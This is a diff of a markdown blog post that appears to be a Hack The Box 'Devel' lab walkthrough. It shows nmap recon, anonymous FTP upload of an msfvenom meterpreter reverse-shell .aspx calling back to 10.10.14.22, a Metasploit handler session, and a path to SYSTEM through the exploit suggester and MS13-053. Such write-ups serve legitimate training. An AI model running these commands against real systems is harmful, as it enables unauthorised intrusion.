@@ -1,22 +1,21 @@
 ---
 title: Hack The Box - Devel
 date: 2023-01-5 08:33:00 +0800
-categories: [Vulnhub]
-tags: [vulnhub]
+categories: [hackthebox]
+tags: [hackthebox,windows,ftp,cve,metasploit,easy]
 math: true
 mermaid: true
 toc: true
 comments: true
 ---
+![](/assets/Hackthebox/Devel/0.png)
+## RECON
 
-RECON
 
-
-NMAP
-Strating with nmap  it shows two ports open 80 httpd  and 21 ftp
-```
-┌─[root@linux]─[/home/htb/windows_box/devel] 
-└──╼ #nmap -sC -sV 10.10.10.5 -oN devel.htb 
+### NMAP
+Strating with `nmap`  it shows two ports open `80 httpd`  and `21 ftp`
+```bash
+# nmap -sC -sV 10.10.10.5 -oN devel.htb 
 Starting Nmap 7.92 ( https://nmap.org ) at 2022-12-11 21:31 +0545 
 RTTVAR has grown to over 2.3 seconds, decreasing to 2.0 
 Stats: 0:01:32 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan 
@@ -43,16 +42,16 @@ Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . 
 Nmap done: 1 IP address (1 host up) scanned in 122.97 seconds
 ```
-nmap shows that anonymoys ftp login  is enabled. we can now try to upload file.
+nmap shows that `anonymoys` ftp login  is enabled. we can now try to upload file.
 
-WEB PORT - 80
+### WEB PORT - 80
 The page is just the default IIS page:
 
-HEADERS
-Seeing that this server is running ASP.NET  means we can upload  a .aspx webshell and get shell.
-```
-┌─[root@linux]─[/home/htb/windows_box/devel] 
-└──╼ #curl -I 10.10.10.5 
+### HEADERS
+Seeing that this server is running `ASP.NET`  means we can upload  a `.aspx` webshell and get shell.
+
+```bash
+# curl -I 10.10.10.5 
 HTTP/1.1 200 OK 
 Content-Length: 689 
 Content-Type: text/html 
@@ -64,11 +63,10 @@ X-Powered-By: ASP.NET
 Date: Thu, 05 Jan 2023 02:28:13 GMT
 ```
 
-METERPRETER
-Generating meterpreter reverse shell .
-```
-┌─[root@linux]─[/home/htb/windows_box/devel] 
-└──╼ #msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.22 LPORT=4444 -f aspx > shell.aspx 
+## METERPRETER
+Generating `meterpreter` reverse shell .
+```bash
+# msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.22 LPORT=4444 -f aspx > shell.aspx 
 [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload 
 [-] No arch selected, selecting arch: x86 from the payload 
 No encoder specified, outputting raw payload 
@@ -76,9 +74,8 @@ Payload size: 354 bytes
 Final size of aspx file: 2878 bytes
 ```
 uploading reverse shell using ftp anoymous login .
-```
-┌─[root@linux]─[/home/htb/windows_box/devel] 
-└──╼ #ftp 10.10.10.5 
+```bash
+# ftp 10.10.10.5 
 Connected to 10.10.10.5. 
 220 Microsoft FTP Service 
 Name (10.10.10.5:niraz): anonymous 
@@ -96,9 +93,9 @@ ftp>
 ```
 
 
-SHELL AS WEB
+### SHELL AS WEB
 
-```
+```bash
 msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp 
 payload => windows/meterpreter/reverse_tcp 
 msf6 exploit(multi/handler) > show options 
@@ -135,8 +132,8 @@ whoami
 iis apppool\web
 
 ```
-PRIV ESEC TO SYSTEM
-using metasploit post module local exploit suggester  to look for available methods to priv esec.
+## PRIV ESEC TO SYSTEM
+using metasploit post module `local exploit suggester`  to look for available methods to priv esec.
 ```
 msf6 exploit(multi/handler) > search suggester 
 Matching Modules 
@@ -175,7 +172,7 @@ msf6 post(multi/recon/local_exploit_suggester) > run
 [*] 10.10.10.5 - Valid modules for session 1:
 ```
 
-MS13_053
+## MS13_053
 
 Description:
 This module leverages a kernel pool overflow in Win32k which allows local privilege escalation. The kernel shellcode nulls the ACL for the winlogon.exe process (a SYSTEM process). This allows any unprivileged process to freely migrate to winlogon.exe, achieving privilege escalation.
